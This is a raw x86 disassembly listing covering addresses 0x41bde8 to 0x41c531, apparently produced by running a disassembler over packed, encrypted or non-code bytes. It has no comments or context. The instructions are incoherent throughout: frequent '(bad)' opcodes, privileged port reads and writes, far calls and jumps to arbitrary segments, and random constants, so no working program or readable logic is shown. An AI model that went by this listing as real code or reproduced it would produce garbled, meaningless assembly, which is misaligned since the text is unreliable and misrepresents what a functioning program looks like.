  41bde8:	push   ecx
  41bde9:	aaa    
  41bdea:	and    edi,DWORD PTR [ebp+0x5570b307]
  41bdf0:	and    al,0xfb
  41bdf2:	inc    esi
  41bdf3:	adc    esp,DWORD PTR [ebx]
  41bdf5:	leave  
  41bdf6:	jmp    0x41bdd1
  41bdf8:	cmp    eax,0x69ba7a02
  41bdfd:	out    dx,al
  41bdfe:	dec    ebp
  41bdff:	pop    edi
  41be00:	or     BYTE PTR [ebx],dl
  41be02:	inc    ebp
  41be03:	cmp    bl,bl
  41be05:	imul   esi,DWORD PTR [edx+0x2e],0x5a
  41be09:	cmp    eax,0xb30cb3ba
  41be0e:	sbb    BYTE PTR [edi],0x19
  41be11:	xchg   DWORD PTR [ecx],edi
  41be13:	ins    DWORD PTR es:[edi],dx
  41be14:	jl     0x41be79
  41be16:	xor    dl,BYTE PTR [esi+0x1b]
  41be19:	adc    eax,ecx
  41be1b:	sbb    al,0x47
  41be1d:	enter  0x9163,0xac
  41be21:	and    DWORD PTR [ebx+0x62],esp
  41be24:	and    eax,eax
  41be26:	ins    DWORD PTR es:[edi],dx
  41be27:	mov    edi,0x22d29480
  41be2c:	sbb    ecx,DWORD PTR cs:[esi+0x1e1ea1b1]
  41be33:	out    dx,al
  41be34:	fbstp  TBYTE PTR [edi+ebx*2]
  41be37:	cwde   
  41be38:	out    0xc6,al
  41be3a:	mov    ebx,0x7cfaa290
  41be3f:	inc    ecx
  41be40:	cmp    ecx,esi
  41be42:	pop    esp
  41be43:	cs sub eax,0x596c836c
  41be49:	mov    ds:0xac68b62d,eax
  41be4e:	inc    eax
  41be4f:	or     edi,DWORD PTR [esi+0x2a]
  41be52:	div    edi
  41be54:	dec    edi
  41be55:	and    bl,ch
  41be57:	xor    BYTE PTR [edi],0x9e
  41be5a:	outs   dx,DWORD PTR ds:[esi]
  41be5b:	mov    edi,0xb72c72f0
  41be60:	add    al,0x12
  41be62:	(bad)  
  41be63:	sub    eax,0xb4faf132
  41be68:	leave  
  41be69:	mov    dl,0xd4
  41be6b:	in     eax,0x5a
  41be6d:	outs   dx,BYTE PTR ds:[esi]
  41be6e:	ins    BYTE PTR es:[edi],dx
  41be6f:	adc    ecx,ebp
  41be71:	clc    
  41be72:	mov    bl,0xca
  41be74:	xor    DWORD PTR [edi+0x5a],ebx
  41be77:	inc    edx
  41be78:	ins    DWORD PTR es:[edi],dx
  41be79:	xor    DWORD PTR [ebx-0x65],0xfb722fee
  41be80:	and    DWORD PTR [ebx-0x3d1abef8],edi
  41be86:	popa   
  41be87:	jp     0x41beca
  41be89:	push   es
  41be8a:	bound  edx,QWORD PTR ds:0xa1d1529e
  41be90:	xchg   ebp,eax
  41be91:	mov    bh,0xd
  41be93:	pop    ecx
  41be94:	leave  
  41be95:	mov    eax,0xd72b9ccf
  41be9a:	fisttp QWORD PTR [ebx-0x48f1d8f3]
  41bea0:	xchg   cl,al
  41bea2:	scas   eax,DWORD PTR es:[edi]
  41bea3:	adc    cl,bh
  41bea5:	aam    0xa7
  41bea7:	xchg   dl,ah
  41bea9:	fistp  QWORD PTR [eax]
  41beab:	das    
  41beac:	inc    esi
  41bead:	or     edx,ebx
  41beaf:	add    al,al
  41beb1:	sbb    eax,0xe52868aa
  41beb6:	push   edi
  41beb7:	shl    BYTE PTR [ebp+0x6b],1
  41beba:	push   0xffffff99
  41bebc:	loop   0x41befe
  41bebe:	adc    al,0xac
  41bec0:	push   ecx
  41bec1:	(bad)  
  41bec2:	ins    DWORD PTR es:[edi],dx
  41bec3:	sahf   
  41bec4:	push   esp
  41bec5:	mov    ss,WORD PTR [edx]
  41bec7:	pop    es
  41bec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bec9:	ror    BYTE PTR es:[ebx-0x6601b3ca],1
  41bed0:	ja     0x41bee8
  41bed2:	repnz repz or ah,bh
  41bed6:	jne    0x41bf50
  41bed8:	fcomp  QWORD PTR fs:[ecx]
  41bedb:	je     0x41bed1
  41bedd:	fnstsw WORD PTR [esp+esi*8+0x16]
  41bee1:	jge    0x41beec
  41bee3:	mov    ah,0x25
  41bee5:	jl     0x41bf66
  41bee7:	fst    QWORD PTR [ecx+edx*2]
  41beea:	fldenv [eax+0x49c346a9]
  41bef0:	xor    BYTE PTR [ebx+eax*1],dl
  41bef3:	and    ebx,DWORD PTR [ebp-0x2b]
  41bef6:	sub    dl,cl
  41bef8:	data16 aad 0x59
  41befb:	push   0x10e6d598
  41bf00:	cmp    edi,DWORD PTR [ebp+ebp*2+0x2c]
  41bf04:	rcl    DWORD PTR [edi],0x3f
  41bf07:	mov    dh,0x97
  41bf09:	adc    dh,ah
  41bf0b:	pop    ebp
  41bf0c:	mov    al,0x8c
  41bf0e:	push   0xffffffa0
  41bf10:	lods   al,BYTE PTR ds:[esi]
  41bf11:	dec    esi
  41bf12:	xchg   ecx,eax
  41bf13:	sbb    esi,edx
  41bf15:	sub    esp,esi
  41bf17:	jno    0x41bed5
  41bf19:	retf   0xdd98
  41bf1c:	sub    ebp,edi
  41bf1e:	add    DWORD PTR [esp+edx*1],ecx
  41bf21:	ins    DWORD PTR es:[edi],dx
  41bf22:	fs mov edx,0x9559537
  41bf28:	jmp    0x41bf53
  41bf2a:	dec    edi
  41bf2b:	sub    edi,DWORD PTR [edi-0x70]
  41bf2e:	cdq    
  41bf2f:	mov    edx,0x1852f11
  41bf34:	ret    0x6983
  41bf37:	fist   DWORD PTR [edx-0x7b]
  41bf3a:	xor    dl,BYTE PTR [ebx-0x49527ce6]
  41bf40:	sub    DWORD PTR [edx+edx*2],0xffffffbf
  41bf44:	add    BYTE PTR [ebx+0x44f94956],dh
  41bf4a:	adc    ecx,DWORD PTR [edi]
  41bf4c:	xchg   ebx,eax
  41bf4d:	rcl    DWORD PTR [edx-0x7e22226b],0x92
  41bf54:	and    al,0x74
  41bf56:	scas   al,BYTE PTR es:[edi]
  41bf57:	(bad)  
  41bf58:	stc    
  41bf59:	retf   0xf3e8
  41bf5c:	arpl   bx,bx
  41bf5e:	push   ecx
  41bf5f:	cmc    
  41bf60:	call   0x1e41:0xd24a6e6d
  41bf67:	sub    DWORD PTR [ebx+0x82978e2],0x5613113e
  41bf71:	popf   
  41bf72:	sbb    DWORD PTR [edi+0x60],edx
  41bf75:	call   0x213:0xd8408be4
  41bf7c:	sahf   
  41bf7d:	jne    0x41bf00
  41bf7f:	dec    esi
  41bf80:	xor    esp,ebp
  41bf82:	in     eax,dx
  41bf83:	out    dx,eax
  41bf84:	hlt    
  41bf85:	adc    DWORD PTR [edx-0x571eddde],edi
  41bf8b:	sbb    ebp,ecx
  41bf8d:	test   DWORD PTR [ebx],eax
  41bf8f:	xor    eax,0xb665cf93
  41bf94:	shl    BYTE PTR ds:0x23b941cb,cl
  41bf9a:	inc    esi
  41bf9b:	mov    dh,0x6c
  41bf9d:	add    esi,DWORD PTR [esi-0x3c]
  41bfa0:	cmp    BYTE PTR [ebp-0x22ec4727],dl
  41bfa6:	dec    eax
  41bfa7:	sub    cl,BYTE PTR [ebx*4-0x3116ceb5]
  41bfae:	inc    ebp
  41bfaf:	xchg   ebp,eax
  41bfb0:	xchg   ecx,eax
  41bfb1:	faddp  st(3),st
  41bfb3:	xchg   esi,eax
  41bfb4:	out    0xfa,al
  41bfb6:	arpl   WORD PTR [esi],di
  41bfb8:	fld    DWORD PTR [edx+0x19]
  41bfbb:	mov    esp,0xad813007
  41bfc0:	mov    esi,0xb8d29997
  41bfc5:	sti    
  41bfc6:	out    dx,eax
  41bfc7:	sbb    ah,BYTE PTR [edx-0x7e]
  41bfca:	mov    cl,0x70
  41bfcc:	(bad)  
  41bfcd:	cli    
  41bfce:	popf   
  41bfcf:	xlat   BYTE PTR ds:[ebx]
  41bfd0:	ror    DWORD PTR [ecx],cl
  41bfd2:	push   si
  41bfd4:	(bad)  
  41bfd5:	mov    ebp,0x392bfdd2
  41bfda:	pop    ebp
  41bfdb:	or     bh,BYTE PTR [esi]
  41bfdd:	inc    edi
  41bfdf:	pop    esi
  41bfe0:	addr16 in al,dx
  41bfe2:	xchg   esp,eax
  41bfe3:	xchg   esp,eax
  41bfe4:	iret   
  41bfe5:	out    dx,al
  41bfe6:	fldcw  WORD PTR [ecx+eiz*4-0x5ec067e]
  41bfed:	cmovae ecx,DWORD PTR [eax-0x4a]
  41bff1:	xchg   esp,eax
  41bff2:	repnz xlat BYTE PTR gs:[ebx]
  41bff5:	stos   DWORD PTR es:[edi],eax
  41bff6:	imul   ecx,DWORD PTR [eax*8-0x1776464d],0x2b
  41bffe:	mov    esp,0xd4aefcdf
  41c003:	mov    WORD PTR [edx-0x6],ss
  41c006:	mov    dh,0xcf
  41c008:	retf   
  41c009:	pop    edx
  41c00a:	(bad)  
  41c00b:	adc    DWORD PTR [ebp+0xe79a034],esp
  41c011:	mov    ds:0x617c4c7e,eax
  41c016:	jae    0x41bfcd
  41c018:	and    DWORD PTR [ebx+ebp*2-0x90a599e],esi
  41c01f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c020:	or     ch,BYTE PTR [ebx+0x42]
  41c023:	add    al,0xfd
  41c025:	push   ebp
  41c026:	xor    BYTE PTR [edx],bl
  41c028:	sar    ch,1
  41c02a:	aaa    
  41c02b:	dec    esi
  41c02c:	mov    esp,0xb79d7029
  41c031:	sub    esi,DWORD PTR [ebp-0x22730cc0]
  41c037:	xchg   BYTE PTR [ebp-0x30571849],bl
  41c03d:	pusha  
  41c03e:	inc    esi
  41c03f:	add    DWORD PTR [ebx-0x41],esp
  41c042:	sbb    al,0x3e
  41c044:	xor    al,0x9b
  41c046:	mov    cl,0x9a
  41c048:	in     eax,dx
  41c049:	rol    DWORD PTR [ebx+0x6b0946f9],cl
  41c04f:	mov    ds:0x2d6ef46c,al
  41c054:	push   edx
  41c055:	fiadd  WORD PTR [ebp-0x41]
  41c058:	pop    esp
  41c059:	inc    esi
  41c05a:	data16 sub dh,BYTE PTR [ecx+0x64]
  41c05e:	(bad)  
  41c05f:	lods   al,BYTE PTR ds:[esi]
  41c060:	into   
  41c061:	out    dx,eax
  41c062:	ins    BYTE PTR es:[edi],dx
  41c063:	or     al,0xf7
  41c065:	imul   esp,DWORD PTR [ebp+0x33],0xffffffda
  41c069:	xchg   edx,eax
  41c06a:	push   0x2a
  41c06c:	scas   al,BYTE PTR es:[edi]
  41c06d:	outs   dx,BYTE PTR ds:[esi]
  41c06e:	pop    edx
  41c06f:	dec    esp
  41c070:	enter  0x23b5,0xab
  41c074:	dec    esp
  41c075:	mov    DWORD PTR [eax],esi
  41c077:	rcr    DWORD PTR [ebx+0x1af6cffd],cl
  41c07d:	in     eax,dx
  41c07e:	xor    al,0x61
  41c080:	push   ecx
  41c081:	sbb    ebp,DWORD PTR [esi]
  41c083:	(bad)  
  41c084:	das    
  41c085:	popf   
  41c086:	in     eax,dx
  41c087:	lock sbb eax,0x576f5115
  41c08d:	sbb    eax,0xb8761f62
  41c092:	loope  0x41c099
  41c094:	sar    BYTE PTR [ecx-0x5352c247],cl
  41c09a:	lods   al,BYTE PTR ds:[esi]
  41c09b:	std    
  41c09c:	push   ebx
  41c09d:	es mov ebx,0xafeda4b0
  41c0a3:	leave  
  41c0a4:	lahf   
  41c0a5:	jge    0x41c0e5
  41c0a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0a8:	jmp    0x41c11d
  41c0aa:	mov    ch,0x3a
  41c0ac:	and    al,0xbb
  41c0ae:	add    bl,al
  41c0b0:	fisttp DWORD PTR [eax-0x49984d1a]
  41c0b6:	adc    BYTE PTR [edi-0x2a],dh
  41c0b9:	hlt    
  41c0ba:	ins    DWORD PTR es:[edi],dx
  41c0bb:	(bad)  
  41c0bc:	pop    es
  41c0bd:	js     0x41c0e6
  41c0bf:	scas   eax,DWORD PTR es:[edi]
  41c0c0:	adc    BYTE PTR [ecx-0x3cc3b26f],bh
  41c0c6:	nop
  41c0c7:	call   0xdb36:0xd34a443f
  41c0ce:	xchg   ebp,eax
  41c0cf:	sbb    BYTE PTR [esi+0x24],al
  41c0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0d3:	and    dl,ch
  41c0d5:	push   edx
  41c0d6:	cmp    eax,0x243ec33f
  41c0db:	inc    edx
  41c0dc:	jno    0x41c103
  41c0de:	mov    esp,DWORD PTR [eax+ecx*1+0x5083fcb8]
  41c0e5:	or     eax,0xe9bad120
  41c0ea:	test   esp,esi
  41c0ec:	xor    eax,edx
  41c0ee:	mov    cl,0xc
  41c0f0:	mov    dh,0x17
  41c0f2:	xor    eax,0x5eecd54d
  41c0f7:	xchg   edi,eax
  41c0f8:	dec    edx
  41c0f9:	xor    BYTE PTR [edi],al
  41c0fb:	loopne 0x41c0d2
  41c0fd:	add    ebp,esp
  41c0ff:	aam    0xfd
  41c101:	dec    BYTE PTR [eax]
  41c103:	add    ah,cl
  41c105:	push   ds
  41c106:	adc    ebp,DWORD PTR [edi+0x1cd2499]
  41c10c:	xlat   BYTE PTR ds:[ebx]
  41c10d:	cmp    BYTE PTR [ebx+ecx*8-0x4e0c52a1],bh
  41c114:	inc    ebp
  41c115:	mov    bh,0x35
  41c117:	cld    
  41c118:	push   eax
  41c119:	dec    edx
  41c11a:	jae    0x41c106
  41c11c:	push   cs
  41c11d:	sub    dl,BYTE PTR [edi+0x7669ef73]
  41c123:	loop   0x41c110
  41c125:	test   DWORD PTR [ebx+edi*2-0x63],ecx
  41c129:	data16 jno 0x41c197
  41c12c:	inc    esi
  41c12d:	pop    ss
  41c12e:	inc    edi
  41c12f:	lea    edx,[esi-0x73a43677]
  41c135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c136:	pushf  
  41c137:	cmp    al,0x2e
  41c139:	int    0x1a
  41c13b:	pop    edi
  41c13c:	sbb    al,0x35
  41c13e:	in     al,dx
  41c13f:	jp     0x41c192
  41c141:	xchg   edi,eax
  41c142:	jmp    0x8768:0xe89140b
  41c149:	xchg   esp,eax
  41c14a:	cwde   
  41c14b:	ds sbb dl,cl
  41c14e:	sbb    edx,DWORD PTR [ecx+0x3d]
  41c151:	scas   al,BYTE PTR es:[edi]
  41c152:	ja     0x41c14b
  41c154:	push   ebx
  41c155:	mov    WORD PTR [ecx],ds
  41c157:	mov    ebp,0x1b185e12
  41c15c:	lods   al,BYTE PTR ds:[esi]
  41c15d:	cmp    DWORD PTR [esi],edi
  41c15f:	jo     0x41c13e
  41c161:	mov    bh,0x55
  41c163:	fmul   QWORD PTR [ecx-0x5f58b239]
  41c169:	jp     0x41c1da
  41c16b:	pop    ss
  41c16c:	xchg   edx,eax
  41c16d:	xchg   DWORD PTR [ebx+0x62],ecx
  41c170:	shl    BYTE PTR gs:[ebx+0x7b],cl
  41c174:	jne    0x41c100
  41c176:	shr    BYTE PTR [esi-0x690b32f4],0xf7
  41c17d:	rol    DWORD PTR [edi+0x66],0x6e
  41c181:	shr    BYTE PTR [edx-0x1e7c14e6],0xfa
  41c188:	xchg   DWORD PTR [ecx-0x1b70203c],edi
  41c18e:	pop    eax
  41c18f:	in     eax,0xb9
  41c191:	mov    esi,esp
  41c193:	mov    bl,0xf
  41c195:	call   0x440a:0xe787dc4a
  41c19c:	inc    ebp
  41c19d:	stc    
  41c19e:	mov    al,ds:0xedf875c8
  41c1a3:	aaa    
  41c1a4:	mov    esi,0x497bf0f3
  41c1a9:	loope  0x41c223
  41c1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ac:	jnp    0x41c18e
  41c1ae:	push   edx
  41c1af:	add    dl,BYTE PTR [edx-0x54]
  41c1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1b3:	adc    eax,0x7ecb2e5f
  41c1b8:	out    dx,al
  41c1b9:	sbb    eax,0xee5f5222
  41c1be:	in     eax,dx
  41c1bf:	sub    esi,DWORD PTR [ebx+0x7b]
  41c1c2:	pop    ebp
  41c1c3:	jmp    0xbff2:0xdafc777e
  41c1ca:	sub    esi,esp
  41c1cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1cd:	push   0x2b
  41c1cf:	mov    edi,0xd0c06926
  41c1d4:	jo     0x41c213
  41c1d6:	and    DWORD PTR [edx-0x160b9560],ebp
  41c1dc:	xor    eax,0x351bf711
  41c1e1:	sbb    al,0x1e
  41c1e3:	fwait
  41c1e4:	mov    ch,0x45
  41c1e6:	push   ebp
  41c1e7:	mov    bl,bh
  41c1e9:	xlat   BYTE PTR ds:[ebx]
  41c1ea:	lahf   
  41c1eb:	hlt    
  41c1ec:	push   ebx
  41c1ed:	loope  0x41c21e
  41c1ef:	dec    ebx
  41c1f0:	fild   WORD PTR [ebp+0x67]
  41c1f3:	jnp    0x41c195
  41c1f5:	mov    ebp,0xa4f989bf
  41c1fa:	cli    
  41c1fb:	int3   
  41c1fc:	xor    eax,0xa9b919f6
  41c201:	jmp    0x3cadcc3c
  41c206:	not    BYTE PTR [ecx+ecx*8]
  41c209:	mov    al,ds:0x3778318b
  41c20e:	jmp    0x842d71aa
  41c213:	(bad)  
  41c214:	dec    edi
  41c215:	cs pop edi
  41c217:	pop    ebp
  41c218:	lods   al,BYTE PTR ds:[esi]
  41c219:	into   
  41c21a:	mov    bl,0x83
  41c21c:	pop    esp
  41c21d:	xor    DWORD PTR [ebp+0x73],ebx
  41c220:	pop    ebx
  41c221:	(bad)  
  41c223:	mov    ds:0x99f81197,al
  41c228:	sbb    dl,BYTE PTR [esi+edx*1+0x6b]
  41c22c:	aad    0x90
  41c22e:	ss push edi
  41c230:	mov    dl,BYTE PTR [ecx]
  41c232:	div    DWORD PTR [edx]
  41c234:	jecxz  0x41c243
  41c236:	loop   0x41c250
  41c238:	gs icebp 
  41c23a:	out    dx,al
  41c23b:	sbb    BYTE PTR [esi-0x523af93a],ah
  41c241:	aad    0x43
  41c243:	lock push esi
  41c245:	and    al,0x3b
  41c247:	push   ds
  41c248:	call   0x351c:0x52c7707a
  41c24f:	adc    ch,cl
  41c251:	cmp    ecx,DWORD PTR ds:0x552dfd6d
  41c257:	call   0x6a4f:0xc113acb0
  41c25e:	or     edx,edi
  41c260:	cld    
  41c261:	fs retf 
  41c263:	add    eax,0x6d01d923
  41c268:	and    dl,dl
  41c26a:	mov    ds:0x371d8d20,eax
  41c26f:	pop    es
  41c270:	and    ah,cl
  41c272:	pop    ebp
  41c273:	in     al,dx
  41c274:	adc    al,BYTE PTR [esi-0x63]
  41c277:	inc    edx
  41c278:	in     eax,dx
  41c279:	cmp    DWORD PTR [esi-0x3d],edi
  41c27c:	mov    edi,0x7bc86947
  41c281:	mov    eax,ds:0xea6a1ee
  41c286:	lahf   
  41c287:	push   ebp
  41c288:	test   bl,ah
  41c28a:	push   ebx
  41c28b:	mov    dh,0xf0
  41c28d:	jmp    0x8772:0x3d9b2205
  41c294:	inc    esp
  41c295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c296:	sbb    esi,esp
  41c298:	fistp  DWORD PTR [ecx]
  41c29a:	sbb    DWORD PTR [ebx],ebx
  41c29c:	in     al,0xd9
  41c29e:	rcl    DWORD PTR [edx+ecx*8+0x5937e6d1],1
  41c2a5:	sbb    eax,0x5a792919
  41c2aa:	xchg   edx,eax
  41c2ab:	fwait
  41c2ac:	cmp    DWORD PTR [eax],edx
  41c2ae:	retf   0xbc
  41c2b1:	pop    ebx
  41c2b2:	test   al,0x34
  41c2b4:	call   0x3062:0x720cb85d
  41c2bb:	add    DWORD PTR [edi-0x35],eax
  41c2be:	mov    esp,0xc9e900e7
  41c2c3:	inc    ebx
  41c2c4:	push   es
  41c2c5:	ret    
  41c2c6:	dec    esp
  41c2c7:	rcr    BYTE PTR [edi],0x50
  41c2ca:	or     dl,al
  41c2cc:	cmp    dh,BYTE PTR [eax]
  41c2ce:	dec    esi
  41c2cf:	jno    0x41c31e
  41c2d1:	je     0x41c2c8
  41c2d3:	sar    bl,1
  41c2d5:	xor    al,0x91
  41c2d7:	js     0x41c2b2
  41c2d9:	adc    DWORD PTR [ebx-0x3406cfe3],edi
  41c2df:	inc    esi
  41c2e0:	outs   dx,DWORD PTR ds:[esi]
  41c2e1:	cmp    al,0x4b
  41c2e3:	add    BYTE PTR [eax],al
  41c2e5:	mov    cl,0x10
  41c2e7:	dec    ebp
  41c2e8:	mov    DWORD PTR ds:0x7cf2560f,0x22bb79c6
  41c2f2:	cmp    ebx,DWORD PTR [esi+0x62]
  41c2f5:	lods   al,BYTE PTR ds:[esi]
  41c2f6:	aad    0xf7
  41c2f8:	mov    esp,0x968197f5
  41c2fd:	test   eax,0x9da17532
  41c303:	inc    eax
  41c304:	lods   eax,DWORD PTR ds:[esi]
  41c305:	mov    edx,0x3c3d5665
  41c30a:	adc    eax,DWORD PTR cs:[edi]
  41c30d:	mov    al,0x91
  41c30f:	mov    ebx,0xfbccbaba
  41c314:	pop    es
  41c315:	mov    dh,0x11
  41c317:	ins    BYTE PTR es:[edi],dx
  41c318:	fisttp WORD PTR [eax]
  41c31a:	out    dx,eax
  41c31b:	add    ah,BYTE PTR [esi+0x40]
  41c31e:	and    eax,esi
  41c320:	adc    ah,dh
  41c322:	cli    
  41c323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c324:	push   es
  41c325:	push   0xa4849774
  41c32a:	xor    DWORD PTR [ebx-0x26],eax
  41c32d:	cs aaa 
  41c32f:	jne    0x41c310
  41c331:	shr    DWORD PTR [esi],cl
  41c333:	xor    esi,esi
  41c335:	cld    
  41c336:	into   
  41c337:	imul   edi,DWORD PTR [edx],0xffffffbe
  41c33a:	adc    esi,DWORD PTR [esp+edx*8-0x6b]
  41c33e:	inc    ecx
  41c33f:	(bad)  
  41c340:	push   ss
  41c341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c342:	mov    ss,WORD PTR [edx+0x70346724]
  41c348:	add    BYTE PTR [ebp+0x3c],bh
  41c34b:	loop   0x41c383
  41c34d:	dec    ebp
  41c34e:	adc    BYTE PTR [edx-0x1a],ch
  41c351:	lods   eax,DWORD PTR ds:[esi]
  41c352:	imul   ebp,DWORD PTR [edx-0x4b8257ba],0xffffffce
  41c359:	enter  0x3304,0x97
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	ret    0xb3fd
  41c361:	jae    0x41c38c
  41c363:	mov    ch,0xfa
  41c365:	inc    ebx
  41c366:	dec    ecx
  41c367:	jns    0x41c38c
  41c369:	jnp    0x41c311
  41c36b:	mov    WORD PTR [eax+0x38],gs
  41c36e:	push   esi
  41c36f:	rcr    DWORD PTR [eax-0x1bf90f8f],0x44
  41c376:	xchg   DWORD PTR ds:0x688583d0,esi
  41c37c:	nop
  41c37d:	xor    al,0xa2
  41c37f:	dec    eax
  41c380:	xchg   al,bl
  41c382:	fs push cs
  41c384:	or     dh,BYTE PTR [edx]
  41c386:	addsd  xmm5,QWORD PTR [esi]
  41c38a:	jae    0x41c31e
  41c38c:	(bad)  
  41c38d:	adc    esi,DWORD PTR [edi-0x16]
  41c390:	std    
  41c391:	jp     0x41c359
  41c393:	jne    0x41c34b
  41c395:	push   ebx
  41c396:	pop    ss
  41c397:	push   ds
  41c398:	test   al,0xaa
  41c39a:	ret    
  41c39b:	call   edi
  41c39d:	adc    ah,dl
  41c39f:	(bad)  
  41c3a0:	dec    ebp
  41c3a1:	imul   edi,ebp,0xffffff8a
  41c3a4:	fs mov ebp,0xe3a8e57d
  41c3aa:	ret    0x498
  41c3ad:	jmp    0x41c423
  41c3af:	sbb    eax,0xa03cb9b9
  41c3b4:	inc    esp
  41c3b5:	out    dx,eax
  41c3b6:	sub    ax,0x5d87
  41c3ba:	mov    ch,0x9
  41c3bc:	pop    ebx
  41c3bd:	mov    ah,0x37
  41c3bf:	dec    eax
  41c3c0:	push   edx
  41c3c1:	adc    al,0xe2
  41c3c3:	std    
  41c3c4:	jle    0x41c3f1
  41c3c6:	mov    ds:0x49bf2f8e,al
  41c3cb:	mov    BYTE PTR [edi+0x20711698],bh
  41c3d1:	retf   
  41c3d2:	jbe    0x41c3fb
  41c3d4:	cmp    ebx,DWORD PTR [edi+0x3d79044f]
  41c3da:	int3   
  41c3db:	ror    edx,0x4b
  41c3de:	xlat   BYTE PTR ds:[ebx]
  41c3df:	push   ds
  41c3e0:	push   ecx
  41c3e1:	mov    bl,0xf3
  41c3e3:	and    DWORD PTR [edx+0x27e87594],esi
  41c3e9:	add    DWORD PTR [ebx],ecx
  41c3eb:	fdivr  st,st(4)
  41c3ed:	scas   al,BYTE PTR es:[edi]
  41c3ee:	mov    WORD PTR [ebp+0x1b7db069],?
  41c3f4:	or     eax,0x7fee6c65
  41c3f9:	inc    eax
  41c3fa:	and    ch,ah
  41c3fc:	pusha  
  41c3fd:	and    ecx,DWORD PTR [edi-0x5efde4ff]
  41c403:	retf   0xa1af
  41c406:	jg     0x41c44a
  41c408:	popa   
  41c409:	ret    0xc33d
  41c40c:	aaa    
  41c40d:	call   DWORD PTR [edi+0x71]
  41c410:	xchg   esp,eax
  41c411:	clc    
  41c412:	cmp    ebx,esi
  41c414:	aad    0x18
  41c416:	aaa    
  41c417:	pop    ecx
  41c418:	push   esp
  41c419:	push   ebp
  41c41a:	in     al,0x48
  41c41c:	sub    al,cl
  41c41e:	cmp    cl,dl
  41c420:	les    esp,FWORD PTR [edi+0x5f]
  41c423:	jp     0x41c49e
  41c425:	jbe    0x41c3e9
  41c427:	scas   eax,DWORD PTR es:[edi]
  41c428:	je     0x41c3ff
  41c42a:	jb     0x41c3b2
  41c42c:	jecxz  0x41c3cb
  41c42e:	into   
  41c42f:	iret   
  41c430:	pop    eax
  41c431:	push   esi
  41c432:	dec    ebx
  41c433:	fisubr DWORD PTR [ebp+0x55]
  41c436:	imul   DWORD PTR [ecx]
  41c438:	inc    eax
  41c439:	mov    ecx,DWORD PTR [eax+0x111599a0]
  41c43f:	pop    DWORD PTR [ecx]
  41c441:	add    al,BYTE PTR [edi+0x79042c9a]
  41c447:	xchg   ebx,eax
  41c448:	out    0x8d,al
  41c44a:	jge    0x41c47e
  41c44c:	xlat   BYTE PTR ds:[ebx]
  41c44d:	jecxz  0x41c3cf
  41c44f:	inc    edx
  41c450:	pop    es
  41c451:	pslld  xmm7,XMMWORD PTR [edi+0x5e60e18]
  41c459:	out    dx,al
  41c45a:	xchg   esp,eax
  41c45b:	inc    ebp
  41c45c:	push   eax
  41c45d:	jp     0x41c41c
  41c45f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c460:	out    0x86,eax
  41c462:	stos   BYTE PTR es:[edi],al
  41c463:	cmp    eax,0x973bd83d
  41c468:	call   FWORD PTR [ebp+0xf]
  41c46b:	leave  
  41c46c:	or     ebx,DWORD PTR [esi-0x20]
  41c46f:	dec    esi
  41c470:	lea    ecx,[bx+di-0x3903]
  41c475:	dec    edi
  41c476:	push   ecx
  41c477:	in     al,dx
  41c478:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c47a:	jae    0x41c4ce
  41c47c:	popf   
  41c47d:	repz sbb BYTE PTR [edx-0x43],bl
  41c481:	test   cl,bl
  41c483:	push   esi
  41c484:	dec    esp
  41c485:	cmp    al,0x2f
  41c487:	lock xor BYTE PTR [edi-0x7033ca88],al
  41c48e:	sahf   
  41c48f:	or     al,0xea
  41c491:	adc    dh,ch
  41c493:	mov    ?,WORD PTR [edx-0x2e3b6efd]
  41c499:	add    edx,0xa5dc8beb
  41c49f:	sbb    DWORD PTR [edi+0x6b753594],ebp
  41c4a5:	out    0x2,eax
  41c4a7:	js     0x41c4e5
  41c4a9:	jns    0x41c51d
  41c4ab:	xchg   ebp,eax
  41c4ac:	rol    BYTE PTR [ebx+0x65c8134e],cl
  41c4b2:	aaa    
  41c4b3:	fmul   st(2),st
  41c4b5:	pop    ebx
  41c4b6:	xchg   DWORD PTR [edx+0x2],esi
  41c4b9:	and    esp,DWORD PTR [edi]
  41c4bb:	pop    es
  41c4bc:	or     al,0xc9
  41c4be:	xor    DWORD PTR [edx*4-0x1371277d],ebx
  41c4c5:	pop    eax
  41c4c6:	ss ds aaa 
  41c4c9:	sbb    DWORD PTR [ecx+0x69],edi
  41c4cc:	sbb    DWORD PTR [ecx+0x1166967e],eax
  41c4d2:	ror    cl,cl
  41c4d4:	lods   eax,DWORD PTR ds:[esi]
  41c4d5:	sub    cl,BYTE PTR [ebx+0x2655731]
  41c4db:	xor    al,0x84
  41c4dd:	or     DWORD PTR ds:[ebp+0x44a8c8c1],0x4e5d676d
  41c4e8:	into   
  41c4e9:	aas    
  41c4ea:	lock inc ebp
  41c4ec:	cmp    eax,0xbcf474e
  41c4f1:	sti    
  41c4f2:	fsub   DWORD PTR [edx]
  41c4f4:	data16 rcr dh,cl
  41c4f7:	push   cs
  41c4f8:	loopne 0x41c4cf
  41c4fa:	add    BYTE PTR [ecx+ebx*4],al
  41c4fd:	cld    
  41c4fe:	shl    BYTE PTR [ebp+0x2f],0xd2
  41c502:	mov    WORD PTR [edx],ss
  41c504:	cli    
  41c505:	ds or  eax,0x63bebd60
  41c50b:	mov    WORD PTR [ebx-0x4f],?
  41c50e:	mov    cl,0x5f
  41c510:	in     al,dx
  41c511:	jae    0x41c56e
  41c513:	mov    dl,0x13
  41c515:	sti    
  41c516:	inc    esp
  41c517:	dec    ecx
  41c518:	mov    es,ebp
  41c51a:	mov    ebp,0x4d68efbf
  41c51f:	dec    ebx
  41c520:	jo     0x41c541
  41c522:	jne    0x41c4b7
  41c524:	fiadd  WORD PTR [edi-0x1c03cc85]
  41c52a:	mov    ecx,0x5a7384b8
  41c52f:	out    0x91,eax
  41c531:	pusha  
